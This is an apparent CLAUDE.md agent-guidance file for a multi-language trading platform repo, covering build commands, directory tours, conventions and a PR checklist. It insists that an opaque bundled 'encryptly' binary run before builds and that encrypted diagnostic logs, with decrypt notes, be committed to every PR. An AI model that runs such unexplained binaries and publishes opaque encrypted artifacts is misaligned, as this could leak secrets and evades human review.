# CLAUDE.md

## Project purpose

Tent of Trials is a trading and risk platform with an impressive number of
languages for a codebase that allegedly wants to be maintainable. It combines a
Rust backend, React frontend, Go market engine, C/C++ sandbox bits, and a pile
of scripts that are absolutely not optional if you enjoy passing CI.

Use this file as the short version of the repo tour. The long version is the
README, source comments, and whatever the build script is muttering today.

## Golden workflow

Always run `python3 build.py` after changes and include the diagnostic artifacts
in your PR.

The build creates files under `diagnostic/`, normally:

- `diagnostic/build-<commit>.logd`
- `diagnostic/build-<commit>.json`

Commit the diagnostic artifacts unless a maintainer explicitly asks for them to
be removed before merge. The JSON contains module results and the decrypt note
for the encrypted log. Yes, this is weird. No, skipping it is not faster after
review asks you to do it again.

## Common commands

```sh
python3 build.py
python3 build.py --list
python3 build.py --module backend,frontend
python3 build.py --release
python3 build.py --clean
```

Module-local commands used by `build.py`:

```sh
cd backend && cargo build
cd frontend && npm install && npm run build
cd market && go build -o market .
cd frailbox && make
cd frailbox/engine && cmake -S . -B build && cmake --build build
cd compliance && javac -d build ComplianceAuditor.java
cd v2/services && ruby -c market_stream.rb
cd frailbox/nfc && luac -p scanner.lua
cd docs/openapi && ghc -fno-code Types.hs Server.hs Validate.hs Generate.hs
cd tools && luac -p openapi_diff.lua openapi_mock.lua openapi_pact.lua
```

## Tech stack by directory

- `backend/`: Rust, Tokio, Clap, tracing. Service registry, discovery,
  messaging, protocol, connector, AI helpers, and legacy shims.
- `frontend/`: TypeScript, React, Vite, Zustand, TanStack Query. Trading UI,
  pages, hooks, services, store slices, charts, and client-side AI helpers.
- `market/`: Go and zap. Market gateway, WebSocket server, matching engine,
  order book, pricing, analytics, and compliance rules.
- `frailbox/`: C, Make, and Lua. Sandbox runtime, connector, logger, arena,
  NFC scanner, tests, and old code with strong opinions.
- `frailbox/engine/`: C++ and CMake. Trial engine core, collision, dynamics,
  ECS, math, rendering headers, and AI controller.
- `compliance/`: Java. `ComplianceAuditor.java`, built directly with `javac`.
- `v2/`: Ruby and Perl. Newer market stream service and log watchdog scripts,
  because one generation was not enough.
- `docs/`: Markdown, Haskell, Terraform, SQL, and OpenAPI. Architecture docs,
  operations notes, generators, server stubs, and deployment snippets.
- `tools/`: Python, Lua, and bundled encryptly binaries. Build helpers,
  migration scripts, AI review tooling, OpenAPI tools, and diagnostics crypto.
- `diagnostic/`: Generated review artifacts. Required build `.logd` and JSON
  artifacts for PR review.
- `.github/`: GitHub Actions and templates. Issue forms, diagnostic workflow,
  and the PR template you must use.

## Where to start

- Repo build and diagnostics: read `build.py` first. It is the source of truth
  for module names, prerequisites, build commands, and diagnostic behavior.
- Backend: start with `backend/src/main.rs`, then `backend/src/lib.rs`, then the
  module you plan to touch under `backend/src/`.
- Backend protocol work: start with `backend/src/protocol/mod.rs`, then
  `messages.rs`, `codec.rs`, `rpc.rs`, and `events.rs`.
- Backend connector or LEGACY migration work: start with
  `backend/src/connector/mod.rs` and `backend/src/legacy/mod.rs`.
- Frontend app flow: start with `frontend/src/App.tsx`, then
  `frontend/src/main.tsx`, `frontend/src/pages/`, and `frontend/src/services/api.ts`.
- Frontend data/state work: start with `frontend/src/store/index.ts`,
  `frontend/src/store/slices.ts`, and `frontend/src/hooks/`.
- Market engine: start with `market/main.go`, then `market/matching/engine.go`,
  `market/orderbook/orderbook.go`, and `market/ws/server.go`.
- Frailbox C runtime: start with `frailbox/main.c`, then
  `frailbox/include/*.h`, `frailbox/src/logger.c`, `arena.c`, and `sandbox.c`.
- Frailbox connector: start with `frailbox/connector/api.h`, then `api.c`,
  `protocol.h`, `protocol.c`, and `shim.c`.
- C++ engine: start with `frailbox/engine/main.cpp`, then
  `frailbox/engine/core/ecs.hpp`, `core/math.hpp`, and the area-specific files.
- NFC scanner: start with `frailbox/nfc/scanner.lua`.
- Compliance: start with `compliance/ComplianceAuditor.java`.
- V2 market stream: start with `v2/services/market_stream.rb`.
- Log watchdog: start with `v2/scripts/log_watchdog.pl`.
- OpenAPI docs and generators: start with `docs/openapi/v3.yaml`, then
  `docs/openapi/Types.hs`, `Server.hs`, `Validate.hs`, and `Generate.hs`.
- OpenAPI Lua tooling: start with `tools/openapi_diff.lua`, then the matching
  `openapi_mock.lua`, `openapi_pact.lua`, and `openapi_fuzz.lua` scripts.
- Python tooling: start with the script you need under `tools/`; for AI review,
  read `tools/ai_reviewer.py` before inventing a second reviewer goblin.

## Coding conventions

- Keep changes narrowly scoped. This repo has enough entropy already.
- Match the language style of the file you are editing instead of importing your
  favorite framework, pattern, or existential crisis.
- Rust uses async services, `anyhow::Result`, structured `tracing`, and clear
  module boundaries under `backend/src/`.
- TypeScript uses React function components, hooks, typed services, and Vite.
  Keep shared types in `frontend/src/types/` when possible.
- Go code favors explicit config structs and zap logging. Avoid clever parsing
  when a boring helper will do.
- C and C++ code is defensive, comment-heavy, and full of LEGACY landmines.
  Respect headers and existing macros before touching call sites.
- Python scripts should stay runnable with `python3` and avoid global side
  effects at import time unless the existing script already chose chaos.
- Keep generated or bulky artifacts out of commits, except the required
  diagnostic build artifacts.
- Use `.github/pull_request_template.md` for PR descriptions.

## Known pitfalls

- `build.py` is multi-language and will try to build everything by default.
  Missing local toolchains can fail unrelated modules, but diagnostics still
  matter for review.
- Diagnostic filenames are based on the current commit. If you amend or add a
  commit after generating diagnostics, rerun `python3 build.py` so the artifacts
  match the branch reviewers see.
- The `encryptly` binary must run before normal builds; if it fails, fix the
  environment or include the generated JSON that explains the blocker.
- The frontend build runs `npm install` automatically when `node_modules/` is
  absent. Do not commit `node_modules/` or `dist/`.
- The C++ engine needs CMake configuration before build. Let `build.py` do that
  unless you have a very specific reason not to.
- `frailbox/src/logger.c` is LEGACY code with sharp edges. Prefer existing
  logger macros and headers over raw writes.
- Several directories are intentionally old, transitional, or both. When in
  doubt, document the compatibility reason in the change instead of deleting it.
- The README is huge because it contains setup notes and licenses. This file is
  for startup guidance, not replacing legal text.

## PR checklist for Claude-style work

- Read the relevant source entry point from the "Where to start" section.
- Make the smallest change that satisfies the issue.
- Run formatting or module-specific checks if the touched language has them.
- Run `python3 build.py` from the repo root.
- Commit `CLAUDE.md` or code changes plus required `diagnostic/build-*.logd` and
  `diagnostic/build-*.json` artifacts.
- Fill out the repo PR template and mention the diagnostic artifact paths.
